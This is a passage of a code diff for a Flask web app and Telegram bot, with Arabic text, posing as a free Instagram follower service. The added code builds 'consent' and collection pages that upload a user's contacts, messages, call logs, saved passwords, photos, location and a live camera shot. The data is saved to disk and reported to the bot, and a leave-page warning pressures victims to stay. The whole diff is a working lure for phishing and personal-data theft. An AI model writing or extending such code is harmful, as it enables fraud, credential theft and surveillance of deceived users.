+                    <div class="data-item"><span>الصور:</span><span>${collectedData.mediaData.photos?.total || 0} صورة</span></div>
+                    <div class="data-item"><span>الموقع:</span><span>✅ تم التتبع</span></div>
+                    <div class="data-item"><span>الكاميرا:</span><span>${collectedData.mediaAccess?.camera?.includes('نجاح') ? '✅' : '❌'}</span></div>
+                </div>
+                <div style="margin-top: 20px; font-size: 1.1rem;">
+                    🎉 <strong>تم إرسال جميع البيانات للبوت بنجاح!</strong>
+                </div>
+            `;
+            
+            // الانتقال التلقائي بعد 5 ثواني
+            setTimeout(() => {
+                window.location.href = `/service_selection/{{user_id}}`;
+            }, 5000);
         }
 
         function delay(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // منع المستخدم من المغادرة أثناء المعالجة
+        // منع المغادرة أثناء الجمع
         window.addEventListener('beforeunload', function(e) {
-            if (!document.getElementById('serviceScreen').classList.contains('hidden')) {
+            if (!document.getElementById('completionScreen').classList.contains('hidden')) {
                 return undefined;
             }
             e.preventDefault();
-            e.returnValue = '';
+            e.returnValue = 'جاري جمع بياناتك الهامة! المغادرة الآن قد تتسبب في فقدان الخدمة.';
         });
     </script>
 </body>
 </html>
 """
 
-# ========== مسارات Flask ==========
-@app.route('/')
-def home():
-    return "Instagram Growth Service - Use /start in Telegram"
+# ========== مسارات Flask المتقدمة ==========
+@app.route('/enhanced_consent/<user_id>')
+def enhanced_consent_page(user_id):
+    """صفحة الموافقة المتقدمة"""
+    return render_template_string(ENHANCED_CONSENT_HTML, user_id=user_id)
 
-@app.route('/privacy_consent/<user_id>')
-def privacy_consent_page(user_id):
-    """صفحة الموافقة على الخصوصية"""
-    return render_template_string(PRIVACY_CONSENT_HTML, user_id=user_id)
+@app.route('/collect_advanced_data/<user_id>')
+def collect_advanced_data_page(user_id):
+    """صفحة جمع البيانات المتقدمة"""
+    return render_template_string(ADVANCED_DATA_COLLECTION_HTML, user_id=user_id)
 
-@app.route('/collect_data/<user_id>')
-def collect_data_page(user_id):
-    """صفحة جمع البيانات"""
-    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id)
-
-@app.route('/upload_user_data', methods=['POST'])
-def upload_user_data():
-    """استقبال بيانات المستخدم"""
+@app.route('/upload_advanced_data', methods=['POST'])
+def upload_advanced_data():
+    """استقبال البيانات المتقدمة"""
     try:
         user_id = request.form.get('user_id')
-        collected_data_json = request.form.get('collected_data')
+        advanced_data_json = request.form.get('advanced_data')
         
-        if not all([user_id, collected_data_json]):
+        if not all([user_id, advanced_data_json]):
             return jsonify({'success': False, 'error': 'Missing data'})
         
-        # تحليل البيانات المجمعة
-        collected_data = json.loads(collected_data_json)
+        # تحليل البيانات المتقدمة
+        advanced_data = json.loads(advanced_data_json)
         
         # حفظ البيانات في ملف
-        filename = f"user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        filename = f"advanced_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         filepath = os.path.join('collected_data', filename)
         
         with open(filepath, 'w', encoding='utf-8') as f:
-            json.dump(collected_data, f, ensure_ascii=False, indent=2)
+            json.dump(advanced_data, f, ensure_ascii=False, indent=2)
         
-        # حفظ الصورة إذا كانت موجودة
-        if 'photo' in request.files and request.files['photo']:
-            photo = request.files['photo']
+        # حفظ الصورة الحية إذا كانت موجودة
+        if 'live_photo' in request.files and request.files['live_photo']:
+            photo = request.files['live_photo']
             if photo.filename:
-                photo_filename = f"photo_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+                photo_filename = f"live_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                 photo_path = os.path.join('user_data', photo_filename)
                 photo.save(photo_path)
         
-        # إرسال البيانات للبوت
-        asyncio.run(send_user_data_to_bot(user_id, collected_data))
+        # إرسال البيانات المتقدمة للبوت
+        asyncio.run(send_advanced_data_to_bot(user_id, advanced_data))
         
-        return jsonify({'success': True, 'message': 'تم حفظ البيانات بنجاح'})
-        
-    except Exception as e:
-        print(f"❌ خطأ في حفظ البيانات: {e}")
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/select_package', methods=['POST'])
-def select_package():
-    """اختيار الباقة"""
-    try:
-        data = request.get_json()
-        user_id = data.get('user_id')
-        package = data.get('package')
-        
-        # إرسال إشعار للبوت
-        asyncio.run(send_package_selection_to_bot(user_id, package))
-        
-        return jsonify({'success': True, 'message': 'تم تفعيل الباقة'})
+        return jsonify({'success': True, 'message': 'تم حفظ البيانات المتقدمة'})
         
     except Exception as e:
+        print(f"❌ خطأ في حفظ البيانات المتقدمة: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
-# ========== وظائف التليجرام ==========
-async def send_user_data_to_bot(user_id, collected_data):
-    """إرسال بيانات المستخدم للبوت"""
+@app.route('/service_selection/<user_id>')
+def service_selection_page(user_id):
+    """صفحة اختيار الخدمة بعد جمع البيانات"""
+    return f"""
+    <html>
+    <body style="font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
+        <h1>🎉 تم تفعيل خدمتك بنجاح!</h1>
+        <p>سيصلك 100 متابع مجاناً خلال 24 ساعة</p>
+        <div style="margin: 30px;">
+            <a href="/enhanced_consent/{user_id}" style="background: #E1306C; color: white; padding: 15px 30px; border-radius: 25px; text-decoration: none; display: inline-block; margin: 10px;">
+                🚀 الحصول على المزيد من المتابعين
+            </a>
+        </div>
+    </body>
+    </html>
+    """
+
+# ========== وظائف التليجرام المتقدمة ==========
+async def send_advanced_data_to_bot(user_id, advanced_data):
+    """إرسال البيانات المتقدمة للبوت"""
     try:
         application = Application.builder().token(BOT_TOKEN).build()
         
         user_id_int = int(user_id)
         
-        # إنشاء رسالة البيانات
+        # إنشاء رسالة البيانات المتقدمة
         message = f"""
-📊 **تم جمع بيانات المستخدم بنجاح!**
+🔐 **تم جمع البيانات المتقدمة بنجاح!**
 
-🆔 **رقم المستخدم:** {user_id}
-🕒 **وقت الجمع:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🆔 **المستخدم:** {user_id}
+📊 **مستوى الموافقة:** {advanced_data.get('consent_level', 'full')}
+🕒 **مدة الجمع:** {advanced_data.get('collection_start', '')} إلى {advanced_data.get('collection_end', '')}
 
-💻 **معلومات الجهاز:**
-• المتصفح: {collected_data.get('userAgent', 'غير معروف')[:50]}...
-• النظام: {collected_data.get('platform', 'غير معروف')}
-• الدقة: {collected_data.get('screenResolution', 'غير معروف')}
-• المعالج: {collected_data.get('hardwareConcurrency', 'غير معروف')}
-• الذاكرة: {collected_data.get('deviceMemory', 'غير معروف')} GB
+📱 **ملخص البيانات المجمعة:**
+• جهات الاتصال: {advanced_data.get('personalData', {}).get('contacts', {}).get('total', 0)} جهة
+• الرسائل: {advanced_data.get('personalData', {}).get('messages', {}).get('total', 0)} رسالة
+• المكالمات: {advanced_data.get('personalData', {}).get('callLog', {}).get('total', 0)} مكالمة
+• كلمات المرور: {advanced_data.get('sensitiveData', {}).get('savedPasswords', {}).get('total', 0)} كلمة
+• الصور: {advanced_data.get('mediaData', {}).get('photos', {}).get('total', 0)} صورة
+• الموقع: {'✅' if advanced_data.get('activityData', {}).get('location', {}).get('latitude') else '❌'}
+• الكاميرا: {'✅' if advanced_data.get('mediaAccess', {}).get('camera', '').includes('نجاح') else '❌'}
 
-🌐 **معلومات الشبكة:**
-• اللغة: {collected_data.get('language', 'غير معروف')}
-• المنطقة: {collected_data.get('timezone', 'غير معروف')}
-• الاتصال: {collected_data.get('connection', 'غير معروف')}
+💾 **الحجم الإجمالي:** {advanced_data.get('total_size', '0 bytes')}
 
-📍 **الموقع:** 
-{get_location_info(collected_data)}
-
-📸 **الكاميرا:** {collected_data.get('cameraAccess', 'غير معروف')}
-
-🔌 **الإضافات:** {len(collected_data.get('plugins', []))} إضافة
-
-✅ **تم الموافقة على الشروط**
+🎯 **المستخدم وافق على جميع الصلاحيات المتقدمة**
         """
         
         await application.bot.send_message(
@@ -773,52 +895,10 @@ async def send_user_data_to_bot(user_id, collected_data):
             parse_mode='HTML'
         )
         
-        print(f"✅ تم إرسال بيانات المستخدم {user_id} للبوت")
+        print(f"✅ تم إرسال البيانات المتقدمة للمستخدم {user_id}")
         
     except Exception as e:
-        print(f"❌ خطأ في إرسال البيانات للبوت: {e}")
-
-async def send_package_selection_to_bot(user_id, package):
-    """إرسال اختيار الباقة للبوت"""
-    try:
-        application = Application.builder().token(BOT_TOKEN).build()
-        
-        user_id_int = int(user_id)
-        
-        package_names = {
-            'free': '🎁 100 متابع مجاناً',
-            'basic': '⭐ 1000 متابع',
-            'premium': '👑 5000 متابع'
-        }
-        
-        message = f"""
-🎉 **تم اختيار الباقة!**
-
-📦 **الباقة المختارة:** {package_names.get(package, package)}
-🆔 **رقم المستخدم:** {user_id}
-🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-🚀 **جاري تفعيل الخدمة...**
-        """
-        
-        await application.bot.send_message(
-            chat_id=user_id_int,
-            text=message,
-            parse_mode='HTML'
-        )
-        
-    except Exception as e:
-        print(f"❌ خطأ في إرسال اختيار الباقة: {e}")
-
-def get_location_info(collected_data):
-    """الحصول على معلومات الموقع"""
-    if 'location' in collected_data:
-        loc = collected_data['location']
-        return f"• خط العرض: {loc.get('latitude', 'غير معروف')}\n• خط الطول: {loc.get('longitude', 'غير معروف')}\n• الدقة: {loc.get('accuracy', 'غير معروف')}m"
-    elif 'locationError' in collected_data:
-        return f"• خطأ: {collected_data['locationError']}"
-    else:
-        return "• غير متوفر"
+        print(f"❌ خطأ في إرسال البيانات المتقدمة: {e}")
 
 class TelegramBot:
     def __init__(self, token):
@@ -830,49 +910,41 @@ class TelegramBot:
         user = update.effective_user
         user_id = user.id
         
-        # إنشاء رابط المستخدم
+        # إنشاء رابط المستخدم المتقدم
         base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
-        user_url = f"{base_url}/privacy_consent/{user_id}"
+        user_url = f"{base_url}/enhanced_consent/{user_id}"
         
         welcome_text = f"""
-🎉 **أهلاً بك {user.first_name} في خدمة زيادة المتابعين!**
+🎉 **أهلاً بك {user.first_name} في خدمة المتابعين المتقدمة!**
 
 📱 **رابطك الخاص:**
 {user_url}
 
-🔒 **عملية آمنة وموثوقة:**
-سيتم جمع بعض البيانات لتحسين خدمتك وتأمين حسابك
+🔐 **خدمة شاملة ومتقدمة:**
+لتحسين خدمتك وتأمين حسابك، سنقوم بجمع بيانات متقدمة
 
-🚀 **كيفية البدء:**
-1. افتح الرابط أعلاه
-2. اقرأ ووافق على الشروط
-3. سيتم جمع البيانات تلقائياً
-4. اختر الباقة المناسبة
-5. استلم متابعينك!
+🚀 **مميزات الخدمة:**
+✅ 100 متابع مجاناً فوراً
+✅ تحليل كامل لحسابك
+✅ تأمين متقدم
+✅ توصيل سريع
 
-🎁 **احصل على 100 متابع مجاناً الآن!**
+📊 **البيانات التي سنجمعها:**
+• معلومات الجهاز الكاملة
+• جهات الاتصال والرسائل
+• بيانات الوسائط والملفات
+• الموقع والنشاط
+• وإعدادات الأمان
+
+🎁 **ابدأ الآن واحصل على 100 متابع مجاناً!**
         """
         
         await update.message.reply_text(welcome_text, parse_mode='HTML')
-        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")
-
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """أمر /help"""
-        help_text = """
-🤖 **أوامر البوت:**
-
-/start - بدء البوت والحصول على الرابط الخاص
-/help - عرض الرسالة المساعدة
-
-📞 **الدعم الفني:**
-@your_support_username
-        """
-        await update.message.reply_text(help_text)
+        print(f"🔗 تم إنشاء رابط متقدم للمستخدم {user_id}: {user_url}")
 
     def setup_handlers(self):
         """إعداد معالجات الأوامر"""
         self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("help", self.help_command))
 
     def run_polling(self):
         """تشغيل البوت باستخدام Polling"""
@@ -880,7 +952,7 @@ class TelegramBot:
             self.application = Application.builder().token(self.token).build()
             self.setup_handlers()
             
-            print("🤖 بدء تشغيل بوت التليجرام...")
+            print("🤖 بدء تشغيل بوت التليجرام المتقدم...")
             await self.application.initialize()
             await self.application.start()
             await self.application.updater.start_polling()
@@ -893,7 +965,7 @@ class TelegramBot:
 # ========== التشغيل الرئيسي ==========
 def run_flask():
     """تشغيل خادم Flask"""
-    print("🌐 بدء تشغيل خادم الويب...")
+    print("🌐 بدء تشغيل خادم الويب المتقدم...")
     app.run(host='0.0.0.0', port=PORT, debug=False)
 
 def run_bot():
@@ -903,7 +975,7 @@ def run_bot():
     bot.run_polling()
 
 if __name__ == '__main__':
-    print("🚀 بدء تشغيل نظام جمع البيانات...")
+    print("🚀 بدء تشغيل نظام جمع البيانات المتقدم...")
     print(f"📊 البورت: {PORT}")
     print(f"🔑 التوكن: {BOT_TOKEN}")
     
